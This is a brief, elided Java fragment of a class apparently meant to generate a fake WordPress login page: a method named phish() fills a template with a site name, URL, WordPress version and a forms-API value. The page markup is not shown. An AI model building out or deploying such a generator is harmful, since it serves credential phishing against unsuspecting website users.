...
public class WPDefaultLogin {
    ...
    public static void phish() throws IOException {
        ...
        String wpVersion = scanner.nextLine();
        ...
        """.formatted(websiteName,url,wpVersion,url,wpVersion,url,wpVersion, url, wpVersion, url, wpVersion, staticFormsApi, url, url, websiteName);
